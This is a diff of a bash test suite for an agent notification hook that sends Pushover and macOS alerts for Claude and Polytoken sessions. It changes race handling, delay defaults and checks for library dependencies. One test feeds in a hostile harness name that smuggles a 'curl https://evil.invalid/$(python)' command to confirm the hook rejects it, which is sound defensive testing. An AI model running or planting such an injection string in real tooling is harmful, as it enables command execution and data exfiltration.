@@ -43,7 +43,10 @@ wait_until wait_count 0 && [ ! -d "$TMP/missing-nomac" ] && ok "non-mac missing 
 # curl receives (ac asserts run under creds; this one checks the mac lane).
 : > "$LOG"; : > "$OSA"
 run claude '{"hook_event_name":"Stop","session_id":"macbody","message":"mac body check"}'
-wait_until test -s "$OSA" && grep -Fq 'session=macbody' "$OSA" && ok "worker mac send receives the sanitized title/body" || no "worker mac send receives the sanitized title/body"
+# Drain BOTH lanes before the next test truncates the shared logs: the mac send
+# lands first, then the Pushover curl (async worker).
+wait_until test -s "$OSA" && wait_until wait_text macbody \
+  && grep -Fq 'session=macbody' "$OSA" && ok "worker mac send receives the sanitized title/body" || no "worker mac send receives the sanitized title/body"
 # Unknown/hostile harness identities fail open before state or outbound work.
 : > "$LOG"; printf '%s' '{"hook_event_name":"Stop","session_id":"hostile"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/hostile-state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" 'claude;curl https://evil.invalid/$(python);AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' >/dev/null
 [ "$(count)" = 0 ] && [ ! -e "$TMP/hostile-state" ] && ok "unknown hostile harness fails open" || no "unknown hostile harness fails open"
@@ -60,7 +63,9 @@ wait_until wait_count 1 && [ "$(grep -Fc first "$LOG" || true)" = 0 ] && grep -q
 : > "$LOG"; run claude '{"hook_event_name":"Stop","session_id":"cross","message":"claude"}' & p1=$!; run polytoken '{"event":"stop","session_id":"cross","message":"poly"}' & p2=$!; wait $p1 $p2
 wait_until wait_count 2 && grep -q -- '--data-urlencode title=Agent ' "$LOG" && grep -q 'session=cross' "$LOG" && ok "cross-harness isolation and identity" || no "cross-harness isolation and identity"
 # Prompt cancellation is synchronous and prevents the delayed worker from sending.
-: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.15 run claude '{"hook_event_name":"Stop","session_id":"cancel","message":"wait"}'
+# Cancellation is synchronous and wins the race by design: the worker sleeps
+# 2s before its gen re-check, so even a loaded host finishes the cancel first.
+: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=2 run claude '{"hook_event_name":"Stop","session_id":"cancel","message":"wait"}'
 out="$(printf '%s' '{"hook_event_name":"UserPromptSubmit","session_id":"cancel"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" OSA_LOG="$OSA" AGENT_NOTIFY_STATE_DIR="$TMP/state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" claude)"; [ -z "$out" ] || no "cancellation prevents delivery"
 ! wait_until wait_text cancel && [ "$(osacount)" = 0 ] && ok "cancellation prevents delivery (and mac send)" || no "cancellation prevents delivery (and mac send)"
 # A newer generation invalidates the old worker before send.
@@ -194,7 +199,13 @@ CLAUDE_CONFIG_DIR="$TMP/both-claude" POLYTOKEN_CONFIG_DIR="$TMP/both-polytoken" 
 # Wiring: Notification and Stop async, no standalone SubagentStop notifier.
 jq -e '([.hooks.Notification[], .hooks.Stop[]] | map(.hooks[] | select(.command | contains("agent-notify.sh"))) | length == 2 and all(.[]; .async == true))' "$REPO/home/settings.recommended.json" >/dev/null && jq -e '([.hooks.SubagentStop[].hooks[]?.command // ""] | all(.[]; contains("agent-notify.sh") | not))' "$REPO/home/settings.recommended.json" >/dev/null && ok "Claude wiring" || no "Claude wiring"
 jq -e '([.[] | select(.name == "agent-notify" and .event == "notification")] | length == 1) and ([.[] | select(.name | startswith("agent-notify")) | .handler.bash | contains(" polytoken")] | all)' "$REPO/polytoken/hooks.json" >/dev/null && ok "Polytoken wiring" || no "Polytoken wiring"
-grep -q 'DELAY="${AGENT_NOTIFY_DELAY:-60}"' "$HOOK" && ok "production delay default" || no "production delay default"
+grep -q 'DELAY="${AGENT_NOTIFY_DELAY:-180}"' "$HOOK" && ok "production delay default" || no "production delay default"
+# The hook's only lib dependency is notify-mac.sh (notify_mac_available/notify_mac_send).
+# notify-identity.sh and notify-send.sh are never used by the hook: any source
+# or call reference (outside comments) is a regression the notify-only install
+# manifest would not cover.
+! grep -Ev '^[[:space:]]*#' "$HOOK" | grep -Eq 'notify-identity|notify-send|notify_identity|notify_send|notify_diag' \
+  && ok "hook references no unused notify libs" || no "hook references no unused notify libs"
 # Exercise the actual Claude installer into a temporary destination, then verify status, content, and mode.
 DEST="$TMP/installed-claude"; HOME="$TMP/home"; mkdir -p "$HOME"
 if CLAUDE_CONFIG_DIR="$DEST" CLAUDE_CONFIG_TTY=/dev/null CLAUDE_CONFIG_OVERWRITE=1 bash "$REPO/install.sh" --target claude --overwrite >/dev/null 2>&1; then
